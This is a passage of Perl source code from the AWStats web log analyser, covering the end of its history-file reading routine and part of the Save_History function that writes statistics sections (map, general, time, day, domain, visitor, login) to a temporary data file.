						Save_History( "extra_$extranum", $year, $month, $date );
						delete $SectionsToSave{"extra_$extranum"};
						if ($withpurge) {
							%{ '_section_' . $extranum . '_p' } = ();
							%{ '_section_' . $extranum . '_h' } = ();
							%{ '_section_' . $extranum . '_b' } = ();
							%{ '_section_' . $extranum . '_l' } = ();
						}
					}
					if ( !scalar %SectionsToLoad ) {
						debug(" Stop reading history file. Got all we need.");
						last;
					}
					next;
				}
			}

			# BEGIN_PLUGINS
			if (   $AtLeastOneSectionPlugin
				&& $field[0] =~ /^BEGIN_PLUGIN_(\w+)$/i )
			{
				my $pluginname = $1;
				my $found      = 0;
				foreach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {
					if ( $pluginname eq $_ ) {

						# The plugin for this section was loaded
						$found = 1;
						my $issectiontoload =
						  $SectionsToLoad{"plugin_$pluginname"};

						# my $function="SectionReadHistory_$pluginname(\$issectiontoload,\$readxml,\$xmleb,\$countlines)";
						# eval("$function");
						my $function = "SectionReadHistory_$pluginname";
						&$function( $issectiontoload, $readxml, $xmleb,
							$countlines );
						delete $SectionsToLoad{"plugin_$pluginname"};
						if ( $SectionsToSave{"plugin_$pluginname"} ) {
							Save_History( "plugin_$pluginname",
								$year, $month, $date );
							delete $SectionsToSave{"plugin_$pluginname"};
							if ($withpurge) {

								# my $function="SectionInitHashArray_$pluginname()";
								# eval("$function");
								my $function =
								  "SectionInitHashArray_$pluginname";
								&$function();
							}
						}
						last;
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}

				# The plugin for this section was not loaded
				if ( !$found ) {
					do {
						$_ = <HISTORY>;
						chomp;
						s/\r//;
						
						@field = split( /\s+/, $readxml ? XMLDecodeFromHisto($_) : $_ );
						$countlines++;
						
					} until ( $field[0] eq "END_PLUGIN_$pluginname"
						|| $field[0] eq "${xmleb}END_PLUGIN_$pluginname"
						|| !$_ );
				}
				next;
			}

			# For backward compatibility (ORIGIN section was "HitFromx" in old history files)
			if ( $SectionsToLoad{'origin'} ) {
				if ( $field[0] eq 'HitFrom0' ) {
					$_from_p[0] += 0;
					$_from_h[0] += $field[1];
					next;
				}
				if ( $field[0] eq 'HitFrom1' ) {
					$_from_p[1] += 0;
					$_from_h[1] += $field[1];
					next;
				}
				if ( $field[0] eq 'HitFrom2' ) {
					$_from_p[2] += 0;
					$_from_h[2] += $field[1];
					next;
				}
				if ( $field[0] eq 'HitFrom3' ) {
					$_from_p[3] += 0;
					$_from_h[3] += $field[1];
					next;
				}
				if ( $field[0] eq 'HitFrom4' ) {
					$_from_p[4] += 0;
					$_from_h[4] += $field[1];
					next;
				}
				if ( $field[0] eq 'HitFrom5' ) {
					$_from_p[5] += 0;
					$_from_h[5] += $field[1];
					next;
				}
			}
		}
	}

	if ($withupdate) {

		# Process rest of data saved in 'wait' arrays (data for hosts that are not in history file or no history file found)
		# This can change some values for day, sider and session sections
		if ($Debug) { debug( " Processing data in 'wait' arrays", 3 ); }
		foreach ( keys %_waithost_e ) {
			if ($Debug) {
				debug( "  Visit in 'wait' array for $_ is a new visit", 4 );
			}
			my $newtimehosts =
			  ( $_waithost_s{$_} ? $_waithost_s{$_} : $_host_s{$_} );
			my $newtimehostl =
			  ( $_waithost_l{$_} ? $_waithost_l{$_} : $_host_l{$_} );
			$_url_e{ $_waithost_e{$_} }++;
			$newtimehosts =~ /^(\d\d\d\d\d\d\d\d)/;
			$DayVisits{$1}++;
			if ( $_waithost_s{$_} ) {

				# There was also a second session in processed log
				my $session_url = $_waithost_u{$_} || '';
				my $session_range = GetSessionRange($newtimehosts, $newtimehostl, $session_url);
				if (defined $session_range) {
					$_session{$session_range}++;
				}
			}
		}
	}

	# Write all unwrote sections in section order ('general','time', 'day','sider','session' and other...)
	if ($Debug) {
		debug(
			" Check and write all unwrote sections: "
			  . join( ',', keys %SectionsToSave ),
			2
		);
	}
	foreach my $key (
		sort { $SectionsToSave{$a} <=> $SectionsToSave{$b} }
		keys %SectionsToSave
	  )
	{
		Save_History( "$key", $year, $month, $date, $lastlinenb,
			$lastlineoffset, $lastlinechecksum );
	}
	%SectionsToSave = ();

	# Update offset in map section and last data in general section then close files
	if ($withupdate) {
		if ($xml) { print HISTORYTMP "\n\n</xml>"; }

		# Update offset of sections in the MAP section
		foreach ( sort { $PosInFile{$a} <=> $PosInFile{$b} } keys %ValueInFile )
		{
			if ($Debug) {
				debug( " Update offset of section $_=$ValueInFile{$_} in file at offset $PosInFile{$_}" );
			}
			if ( $PosInFile{"$_"} ) {
				seek( HISTORYTMP, $PosInFile{"$_"}, 0 );
				print HISTORYTMP $ValueInFile{"$_"};
			}
		}

		# Save last data in general sections
		if ($Debug) {
			debug( " Update MonthVisits=$MonthVisits{$year.$month} in file at offset $PosInFile{TotalVisits}" );
		}
		seek( HISTORYTMP, $PosInFile{"TotalVisits"}, 0 );
		print HISTORYTMP $MonthVisits{ $year . $month };
		if ($Debug) {
			debug( " Update MonthUnique=$MonthUnique{$year.$month} in file at offset $PosInFile{TotalUnique}" );
		}
		seek( HISTORYTMP, $PosInFile{"TotalUnique"}, 0 );
		print HISTORYTMP $MonthUnique{ $year . $month };
		if ($Debug) {
			debug( " Update MonthHostsKnown=$MonthHostsKnown{$year.$month} in file at offset $PosInFile{MonthHostsKnown}" );
		}
		seek( HISTORYTMP, $PosInFile{"MonthHostsKnown"}, 0 );
		print HISTORYTMP $MonthHostsKnown{ $year . $month };
		if ($Debug) {
			debug( " Update MonthHostsUnknown=$MonthHostsUnknown{$year.$month} in file at offset $PosInFile{MonthHostsUnknown}" );
		}
		seek( HISTORYTMP, $PosInFile{"MonthHostsUnknown"}, 0 );
		print HISTORYTMP $MonthHostsUnknown{ $year . $month };
		close(HISTORYTMP) || error("Failed to write temporary history file");
	}
	if ($withread) {
		close(HISTORY) || error("Command for pipe '$filetoread' failed");
	}

	# Purge data
	if ($withpurge) { &Init_HashArray(); }

	# If update, rename tmp file bis into tmp file or set HistoryAlreadyFlushed
	if ($withupdate) {
		if ( $HistoryAlreadyFlushed{"$year$month$day$hour"} ) {
			debug(
				"Rename tmp history file bis '$filetoread' to '$filetowrite'");
			if ( rename( $filetowrite, $filetoread ) == 0 ) {
				error("Failed to update tmp history file $filetoread");
			}
		}
		else {
			$HistoryAlreadyFlushed{"$year$month$day$hour"} = 1;
		}

		if ( !$ListOfYears{"$year"} || $ListOfYears{"$year"} lt "$month" ) {
			$ListOfYears{"$year"} = "$month";
		}
	}

	# For backward compatibility, if LastLine does not exist, set to LastTime
	$LastLine ||= $LastTime{$date};

	return ( $withupdate ? "$filetowrite" : "" );
}

#------------------------------------------------------------------------------
# Function:     Write a data section to the temporary history file
# Parameters:   sectiontosave - Section name (header, general, time, visitor, etc.)
#               year, month, breakdate - Date context for the data
#               [lastlinenb, lastlineoffset, lastlinechecksum] - Line tracking
# Input:        HISTORYTMP (open filehandle), global data structures (%_host_h, 
#               %_url_p, %_session, etc.), $VERSION, current timestamp
# Output:       Writes section data to HISTORYTMP filehandle, updates %PosInFile
#               (byte offsets for each section) and %ValueInFile
# Return:       None
# Note:         Called by Read_History_With_TmpUpdate to build updated history file
#------------------------------------------------------------------------------
sub Save_History {
	my $sectiontosave = shift || '';
	my $year          = shift || '';
	my $month         = shift || '';
	my $breakdate     = shift || '';

	my $xml = ( $BuildHistoryFormat eq 'xml' ? 1 : 0 );
	my (
		$xmlbb, $xmlbs, $xmlbe, $xmlhb, $xmlhs, $xmlhe,
		$xmlrb, $xmlrs, $xmlre, $xmleb, $xmlee
	  )
	  = ( '', '', '', '', '', '', '', '', '', '', '' );
	if ($xml) {
		(
			$xmlbb, $xmlbs, $xmlbe, $xmlhb, $xmlhs, $xmlhe,
			$xmlrb, $xmlrs, $xmlre, $xmleb, $xmlee
		  )
		  = (
			"</comment><nu>", '</nu><recnb>',
			'</recnb><table>',  '<tr><th>',
			'</th><th>',        '</th></tr>',
			'<tr><td>',         '</td><td>',
			'</td></tr>',       '</table><nu>',
			"\n</nu></section>"
		  );
	}
	else { $xmlbs = ' '; $xmlhs = ' '; $xmlrs = ' '; }

	my $lastlinenb       = shift || 0;
	my $lastlineoffset   = shift || 0;
	my $lastlinechecksum = shift || 0;
	# This happens for migrate
	if ( !$lastlinenb ) {
		$lastlinenb       = $LastLineNumber;
		$lastlineoffset   = $LastLineOffset;
		$lastlinechecksum = $LastLineChecksum;
	}

	if ($Debug) {
		debug( " Save_History [sectiontosave=$sectiontosave,year=$year,month=$month,breakdate=$breakdate,lastlinenb=$lastlinenb,lastlineoffset=$lastlineoffset,lastlinechecksum=$lastlinechecksum]", 1 );
	}
	my $spacebar      = "                    ";
	my %keysinkeylist = ();

	# Header
	if ( $sectiontosave eq 'header' ) {
		if ($xml) { print HISTORYTMP "<version><lib>"; }
		print HISTORYTMP "AWSTATS DATA FILE $VERSION\n";
		if ($xml) { print HISTORYTMP "</lib><comment>"; }
		my $msg1 = $translate_map{"If you remove this file, all statistics for date"} // "If you remove this file, all statistics for date";
		my $msg2 = $translate_map{"will be lost/reset."} // "will be lost/reset.";
		print HISTORYTMP "# $msg1 $breakdate $msg2\n";
		
		my $msg3 = $translate_map{"Last config file used to build this data file was"} // "Last config file used to build this data file was";
		print HISTORYTMP "# $msg3 $FileConfig.\n";
		
		if ($xml) { print HISTORYTMP "</comment></version>"; }
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		
		my $msg4 = $translate_map{"Position (offset in bytes) in this file for beginning of each section for"} // "Position (offset in bytes) in this file for beginning of each section for";
		print HISTORYTMP "# $msg4\n";
		
		my $msg5 = $translate_map{"direct I/O access. If you made changes somewhere in this file, you should"} // "direct I/O access. If you made changes somewhere in this file, you should";
		print HISTORYTMP "# $msg5\n";
		
		my $msg6 = $translate_map{"also remove completely the MAP section (AWStats will rewrite it at next update)"} // "also remove completely the MAP section (AWStats will rewrite it at next update)";
		print HISTORYTMP "# $msg6\n";
		
		print HISTORYTMP "${xmlbb}BEGIN_MAP${xmlbs}"
		  . ( 27 + ( scalar keys %TrapInfosForHTTPErrorCodes ) +
			  ( scalar @ExtraName ? scalar @ExtraName - 1 : 0 ) +
			  ( scalar keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) )
		  . "${xmlbe}\n";
		print HISTORYTMP "${xmlrb}POS_GENERAL${xmlrs}";
		$PosInFile{"general"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";

		# When
		print HISTORYTMP "${xmlrb}POS_TIME${xmlrs}";
		$PosInFile{"time"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_VISITOR${xmlrs}";
		$PosInFile{"visitor"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_DAY${xmlrs}";
		$PosInFile{"day"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";

		# Who
		print HISTORYTMP "${xmlrb}POS_DOMAIN${xmlrs}";
		$PosInFile{"domain"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_LOGIN${xmlrs}";
		$PosInFile{"login"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_ROBOT${xmlrs}";
		$PosInFile{"robot"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_WORMS${xmlrs}";
		$PosInFile{"worms"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_EMAILSENDER${xmlrs}";
		$PosInFile{"emailsender"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_EMAILRECEIVER${xmlrs}";
		$PosInFile{"emailreceiver"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";

		# Navigation
		print HISTORYTMP "${xmlrb}POS_SESSION${xmlrs}";
		$PosInFile{"session"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_FILESIZE${xmlrs}";
		$PosInFile{"filesize"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_REQUESTTIME${xmlrs}";
		$PosInFile{"requesttime"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_SIDER${xmlrs}";
		$PosInFile{"sider"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_FILETYPES${xmlrs}";
		$PosInFile{"filetypes"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_DOWNLOADS${xmlrs}";
		$PosInFile{'downloads'} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_OS${xmlrs}";
		$PosInFile{"os"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_BROWSER${xmlrs}";
		$PosInFile{"browser"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_DEVICE${xmlrs}";
		$PosInFile{"device"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_SCREENSIZE${xmlrs}";
		$PosInFile{"screensize"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_UNKNOWNREFERER${xmlrs}";
		$PosInFile{'unknownreferer'} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_UNKNOWNREFERERBROWSER${xmlrs}";
		$PosInFile{'unknownrefererbrowser'} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";

		# Referers
		print HISTORYTMP "${xmlrb}POS_ORIGIN${xmlrs}";
		$PosInFile{"origin"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_SEREFERRALS${xmlrs}";
		$PosInFile{"sereferrals"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_PAGEREFS${xmlrs}";
		$PosInFile{"pagerefs"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_SEARCHWORDS${xmlrs}";
		$PosInFile{"searchwords"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_KEYWORDS${xmlrs}";
		$PosInFile{"keywords"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";

		# Others
		print HISTORYTMP "${xmlrb}POS_PROTOCOL${xmlrs}";
		$PosInFile{"protocol"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_ICONSTATUS${xmlrs}";
		$PosInFile{"iconstatus"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_ERRORS${xmlrs}";
		$PosInFile{"errors"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}POS_CLUSTER${xmlrs}";
		$PosInFile{"cluster"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";

		foreach ( keys %TrapInfosForHTTPErrorCodes ) {
			print HISTORYTMP "${xmlrb}POS_SIDER_$_${xmlrs}";
			$PosInFile{"sider_$_"} = tell HISTORYTMP;
			print HISTORYTMP "$spacebar${xmlre}\n";
		}
		foreach ( 1 .. @ExtraName - 1 ) {
			print HISTORYTMP "${xmlrb}POS_EXTRA_$_${xmlrs}";
			$PosInFile{"extra_$_"} = tell HISTORYTMP;
			print HISTORYTMP "$spacebar${xmlre}\n";
		}
		foreach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {
			print HISTORYTMP "${xmlrb}POS_PLUGIN_$_${xmlrs}";
			$PosInFile{"plugin_$_"} = tell HISTORYTMP;
			print HISTORYTMP "$spacebar${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_MAP${xmlee}\n";
	}

	# General
	if ( $sectiontosave eq 'general' ) {
		$LastUpdate = int("$nowyear$nowmonth$nowday$nowhour$nowmin$nowsec");
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		
		my $g1 = $translate_map{"LastLine    = Date of last record processed - Last record line number in last log - Last record offset in last log - Last record signature value"} // "LastLine    = Date of last record processed - Last record line number in last log - Last record offset in last log - Last record signature value";
		my $g2 = $translate_map{"FirstTime   = Date of first visit for history file"} // "FirstTime   = Date of first visit for history file";
		my $g3 = $translate_map{"LastTime    = Date of last visit for history file"} // "LastTime    = Date of last visit for history file";
		my $g4 = $translate_map{"LastUpdate  = Date of last update - Nb of parsed records - Nb of parsed old records - Nb of parsed new records - Nb of parsed corrupted - Nb of parsed dropped"} // "LastUpdate  = Date of last update - Nb of parsed records - Nb of parsed old records - Nb of parsed new records - Nb of parsed corrupted - Nb of parsed dropped";
		my $g5 = $translate_map{"TotalVisits = Number of visits"} // "TotalVisits = Number of visits";
		my $g6 = $translate_map{"TotalUnique = Number of unique visitors"} // "TotalUnique = Number of unique visitors";
		my $g7 = $translate_map{"MonthHostsKnown   = Number of hosts known"} // "MonthHostsKnown   = Number of hosts known";
		my $g8 = $translate_map{"MonthHostsUnKnown = Number of hosts unknown"} // "MonthHostsUnKnown = Number of hosts unknown";
		
		print HISTORYTMP "# $g1\n";
		print HISTORYTMP "# $g2\n";
		print HISTORYTMP "# $g3\n";
		print HISTORYTMP "# $g4\n";
		print HISTORYTMP "# $g5\n";
		print HISTORYTMP "# $g6\n";
		print HISTORYTMP "# $g7\n";
		print HISTORYTMP "# $g8\n";
		
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_GENERAL${xmlbs}8${xmlbe}\n";
		print HISTORYTMP "${xmlrb}LastLine${xmlrs}"
		  . ( $LastLine > 0 ? $LastLine : $LastTime{$breakdate} )
		  . " $lastlinenb $lastlineoffset $lastlinechecksum${xmlre}\n";
		print HISTORYTMP "${xmlrb}FirstTime${xmlrs}"
		  . $FirstTime{$breakdate}
		  . "${xmlre}\n";
		print HISTORYTMP "${xmlrb}LastTime${xmlrs}"
		  . $LastTime{$breakdate}
		  . "${xmlre}\n";
		print HISTORYTMP "${xmlrb}LastUpdate${xmlrs}$LastUpdate $NbOfLinesParsed $NbOfOldLines $NbOfNewLines $NbOfLinesCorrupted $NbOfLinesDropped${xmlre}\n";
		print HISTORYTMP "${xmlrb}TotalVisits${xmlrs}";
		$PosInFile{"TotalVisits"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}TotalUnique${xmlrs}";
		$PosInFile{"TotalUnique"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}MonthHostsKnown${xmlrs}";
		$PosInFile{"MonthHostsKnown"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		print HISTORYTMP "${xmlrb}MonthHostsUnknown${xmlrs}";
		$PosInFile{"MonthHostsUnknown"} = tell HISTORYTMP;
		print HISTORYTMP "$spacebar${xmlre}\n";
		# END_GENERAL on a new line following xml tag because END_ detection does not work like other sections
		print HISTORYTMP "${xmleb}"
		  . ( ${xmleb} ? "\n" : "" )
		  . "END_GENERAL${xmlee}\n";
	}

	# When
	if ( $sectiontosave eq 'time' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		my $t1 = $translate_map{"Hour - Pages - Hits - Bandwidth - Not viewed Pages - Not viewed Hits - Not viewed Bandwidth"} // "Hour - Pages - Hits - Bandwidth - Not viewed Pages - Not viewed Hits - Not viewed Bandwidth";
		print HISTORYTMP "# $t1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_TIME${xmlbs}24${xmlbe}\n";
		for ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {
			print HISTORYTMP "${xmlrb}$ix${xmlrs}"
			  . int( $_time_p[$ix] )
			  . "${xmlrs}"
			  . int( $_time_h[$ix] )
			  . "${xmlrs}"
			  . int( $_time_k[$ix] )
			  . "${xmlrs}"
			  . int( $_time_nv_p[$ix] )
			  . "${xmlrs}"
			  . int( $_time_nv_h[$ix] )
			  . "${xmlrs}"
			  . int( $_time_nv_k[$ix] )
			  . "${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_TIME${xmlee}\n";
	}
	# This section must be saved after VISITOR section is read
	if ( $sectiontosave eq 'day' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><comment>";
		}
		my $d1 = $translate_map{"Date - Pages - Hits - Bandwidth - Visits"} // "Date - Pages - Hits - Bandwidth - Visits";
		print HISTORYTMP "# $d1\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_DAY${xmlbs}"
		  . ( scalar keys %DayHits )
		  . "${xmlbe}\n";
		my $monthvisits = 0;
		# Found a day entry of the good month
		foreach ( sort keys %DayHits ) {
			if ( $_ =~ /^$year$month/i ) {
				my $page   = $DayPages{$_}  || 0;
				my $hits   = $DayHits{$_}   || 0;
				my $bytes  = $DayBytes{$_}  || 0;
				my $visits = $DayVisits{$_} || 0;
				print HISTORYTMP "${xmlrb}$_${xmlrs}$page${xmlrs}$hits${xmlrs}$bytes${xmlrs}$visits${xmlre}\n";
				$monthvisits += $visits;
			}
		}
		$MonthVisits{ $year . $month } = $monthvisits;
		print HISTORYTMP "${xmleb}END_DAY${xmlee}\n";
	}

	# Domain
	if ( $sectiontosave eq 'domain' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><sortfor>$MaxNbOf{'Domain'}</sortfor><comment>";
		}
		my $dom1 = $translate_map{"Domain - Pages - Hits - Bandwidth"} // "Domain - Pages - Hits - Bandwidth";
		print HISTORYTMP "# $dom1\n";
		my $dom2 = sprintf($translate_map{"The %s first Pages must be first (order not required for others)"} // "The %s first Pages must be first (order not required for others)", $MaxNbOf{'Domain'});
		print HISTORYTMP "# $dom2\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_DOMAIN${xmlbs}"
		  . ( scalar keys %_domener_h )
		  . "${xmlbe}\n";

		# We save page list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList(
			$MaxNbOf{'Domain'}, $MinHit{'Domain'},
			\%_domener_h,       \%_domener_p
		);
		my %keysinkeylist = ();
		# ||0 could be commented to reduce history file size
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			my $page = $_domener_p{$_} || 0;
			my $bytes = $_domener_k{$_} || 0;
			print HISTORYTMP "${xmlrb}$_${xmlrs}$page${xmlrs}$_domener_h{$_}${xmlrs}$bytes${xmlre}\n";
		}
		# ||0 could be commented to reduce history file size
		foreach ( keys %_domener_h ) {
			if ( $keysinkeylist{$_} ) { next; }
			my $page = $_domener_p{$_} || 0;
			my $bytes = $_domener_k{$_} || 0;
			print HISTORYTMP "${xmlrb}$_${xmlrs}$page${xmlrs}$_domener_h{$_}${xmlrs}$bytes${xmlre}\n";
		}
		print HISTORYTMP "${xmleb}END_DOMAIN${xmlee}\n";
	}
	
	# Visitor
	if ( $sectiontosave eq 'visitor' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><sortfor>$MaxNbOf{'HostsShown'}</sortfor><comment>";
		}
		my $v1 = $translate_map{"Host - Pages - Hits - Bandwidth - Last visit date - [Start date of last visit] - [Last page of last visit]"} // "Host - Pages - Hits - Bandwidth - Last visit date - [Start date of last visit] - [Last page of last visit]";
		my $v2 = $translate_map{"[Start date of last visit] and [Last page of last visit] are saved only if session is not finished"} // "[Start date of last visit] and [Last page of last visit] are saved only if session is not finished";
		my $v3 = sprintf($translate_map{"The first %s items are sorted by hits in descending order; order of the remaining items is undefined."} // "The first %s items are sorted by hits in descending order; order of the remaining items is undefined.", $MaxNbOf{'HostsShown'});
		print HISTORYTMP "# $v1\n";
		print HISTORYTMP "# $v2\n";
		print HISTORYTMP "# $v3\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_VISITOR${xmlbs}"
		  . ( scalar keys %_host_h )
		  . "${xmlbe}\n";
		my $monthhostsknown = 0;

		# We save page list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'HostsShown'}, $MinHit{'Host'}, \%_host_h, \%_host_p );
		my %keysinkeylist = ();
		foreach my $key (@keylist) {
			if ( $key !~ /^\d+\.\d+\.\d+\.\d+$/ && $key !~ /^[0-9A-F]*:/i ) {
				$monthhostsknown++;
			}
			$keysinkeylist{$key} = 1;
			my $page      = $_host_p{$key} || 0;
			my $bytes     = $_host_k{$key} || 0;
			my $timehostl = $_host_l{$key} || 0;
			my $timehosts = $_host_s{$key} || 0;
			my $lastpage  = $_host_u{$key} || '';
			# Session for this user is expired
			if ( $timehostl && $timehosts && $lastpage ) {
				if ( ( $timehostl + $VISITTIMEOUT ) < $LastLine ) {
					if ($timehosts) {
						my $session_range = GetSessionRange($timehosts, $timehostl, $lastpage);
						if (defined $session_range) {
							$_session{$session_range}++;
						}
					}
					if ($lastpage) { $_url_x{$lastpage}++; }
					delete $_host_s{$key};
					delete $_host_u{$key};
					print HISTORYTMP "${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlre}\n";
				}
				# If this user has started a new session that is not expired
				else {
					print HISTORYTMP "${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlrs}$timehosts${xmlrs}$lastpage${xmlre}\n";
				}
			}
			else {
				my $hostl = $timehostl || '';
				print HISTORYTMP "${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$hostl${xmlre}\n";
			}
		}
		foreach my $key ( keys %_host_h ) {
			if ( $keysinkeylist{$key} ) { next; }
			if ( $key !~ /^\d+\.\d+\.\d+\.\d+$/ && $key !~ /^[0-9A-F]*:/i ) {
				$monthhostsknown++;
			}
			my $page      = $_host_p{$key} || 0;
			my $bytes     = $_host_k{$key} || 0;
			my $timehostl = $_host_l{$key} || 0;
			my $timehosts = $_host_s{$key} || 0;
			my $lastpage  = $_host_u{$key} || '';
			# Session for this user is expired
			if ( $timehostl && $timehosts && $lastpage ) {
				if ( ( $timehostl + $VISITTIMEOUT ) < $LastLine ) {
					if ($timehosts) {
						my $session_range = GetSessionRange($timehosts, $timehostl, $lastpage);
						if (defined $session_range) {
							$_session{$session_range}++;
						}
					}
					if ($lastpage) { $_url_x{$lastpage}++; }
					delete $_host_s{$key};
					delete $_host_u{$key};
					print HISTORYTMP "${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlre}\n";
				}
				# If this user has started a new session that is not expired
				else {
					print HISTORYTMP "${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlrs}$timehosts${xmlrs}$lastpage${xmlre}\n";
				}
			}
			else {
				my $hostl = $timehostl || '';
				print HISTORYTMP "${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$hostl${xmlre}\n";
			}
		}
		$MonthUnique{ $year . $month }       = ( scalar keys %_host_p );
		$MonthHostsKnown{ $year . $month }   = $monthhostsknown;
		$MonthHostsUnknown{ $year . $month } =
		  ( scalar keys %_host_h ) - $monthhostsknown;
		print HISTORYTMP "${xmleb}END_VISITOR${xmlee}\n";
	}
	
	# Login
	if ( $sectiontosave eq 'login' ) {
		print HISTORYTMP "\n";
		if ($xml) {
			print HISTORYTMP "<section id='$sectiontosave'><sortfor>$MaxNbOf{'LoginShown'}</sortfor><comment>";
		}
		my $l1 = $translate_map{"Login - Pages - Hits - Bandwidth - Last visit"} // "Login - Pages - Hits - Bandwidth - Last visit";
		my $l2 = sprintf($translate_map{"The %s first Pages must be first (order not required for others)"} // "The %s first Pages must be first (order not required for others)", $MaxNbOf{'LoginShown'});
		print HISTORYTMP "# $l1\n";
		print HISTORYTMP "# $l2\n";
		$ValueInFile{$sectiontosave} = tell HISTORYTMP;
		print HISTORYTMP "${xmlbb}BEGIN_LOGIN${xmlbs}"
		  . ( scalar keys %_login_h )
		  . "${xmlbe}\n";

		# We save login list in score sorted order to get a -output faster and with less use of memory.
		&BuildKeyList( $MaxNbOf{'LoginShown'}, $MinHit{'Login'}, \%_login_h, \%_login_p );
		my %keysinkeylist = ();
		foreach (@keylist) {
			$keysinkeylist{$_} = 1;
			print HISTORYTMP "${xmlrb}$_${xmlrs}"
			  . int( $_login_p{$_} || 0 )
